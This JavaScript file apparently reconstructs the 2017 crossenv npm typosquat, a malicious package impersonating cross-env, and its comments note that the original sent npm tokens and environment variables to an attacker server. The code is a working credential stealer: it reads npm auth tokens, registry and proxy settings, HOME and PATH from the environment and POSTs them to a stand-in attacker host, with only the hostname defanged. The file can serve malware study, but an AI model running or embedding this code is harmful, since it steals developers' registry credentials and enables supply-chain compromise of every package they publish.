// Reconstructed from the 2017 crossenv typosquat (typosquat of cross-env)
// The original exfiltrated npm tokens and env vars to npm.hacktask.net
// All URLs replaced with safe example domains.

var http = require('https');
var filter = [
  'npm_config_registry',
  'npm_config_//registry.npmjs.org/:_authToken',
  'npm_config_proxy',
  'npm_config_https-proxy',
  'HOME',
  'PATH'
];

var data = {};
for (var key in process.env) {
  if (filter.some(function(f) { return key.indexOf(f) !== -1; })) {
    data[key] = process.env[key];
  }
}

var payload = JSON.stringify(data);
var options = {
  hostname: 'npm.hacktask.example.net',
  port: 443,
  path: '/auth/' + process.env.npm_package_name,
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
};

var req = http.request(options);
req.write(payload);
req.end();
